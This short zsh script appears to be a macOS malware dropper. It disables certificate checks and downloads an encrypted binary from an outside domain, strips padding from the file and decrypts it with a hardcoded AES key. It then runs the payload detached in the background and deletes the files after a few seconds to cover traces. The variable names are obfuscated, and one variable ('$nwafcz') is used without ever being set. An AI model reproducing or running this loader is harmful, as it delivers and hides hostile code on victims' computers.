#!/bin/zsh
nwafc=$(mktemp /tmp/ff4m2e.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m91e65a3d5f45aa76.bin" -o "$nwafcz" || exit 1
wfynb9=$(stat -f %z "$nwafcz"); j9xd4gh=$(( wfynb9 - 1701 - 2626 ))
tail -c +$(( 1701 + 1 )) "$nwafcz" | head -c $j9xd4gh | openssl enc -d -aes-256-cbc -k 196085905a73925b715b913f -out "$nwafc" 2>/dev/null
[ -s "$nwafc" ] && chmod 700 "$nwafc" && ( "$nwafc" & ) && disown
( sleep 3; rm -f "$nwafc" "$nwafcz" ) &>/dev/null &
